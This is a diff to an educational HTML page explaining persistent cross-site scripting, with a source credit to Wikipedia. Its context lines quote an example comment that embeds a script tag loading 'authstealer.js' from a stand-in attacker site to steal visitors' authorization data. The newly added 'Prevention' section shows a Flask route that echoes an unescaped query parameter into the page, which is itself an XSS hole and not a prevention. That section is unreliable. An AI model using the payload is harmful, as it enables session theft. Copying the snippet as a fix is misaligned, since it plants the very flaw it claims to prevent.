@@ -35,6 +35,17 @@
         They leave the following comment: </p>
     <p><b>I love the puppies in this story! They're so cute!&lt;script src="http://mallorysevilsite.com/authstealer.js"&gt;</b></p>
     <p>Now anyone who loads this article has their site authorization data sent to the malicious user's hidden server.</p>
+
+    <h2>Prevention</h2>
+    <p></p>
+    <pre>
+        <code>
+            @app.route("/")
+            def hello():
+                name = request.args.get('name')
+                return "Hello %s" % name
+        </code>
+      </pre>
 </body>
 <footer>
     <p>Source: <a href="https://en.wikipedia.org/wiki/Cross-site_scripting#Persistent_attack" target="_blank"> Wikipedia</a></p>
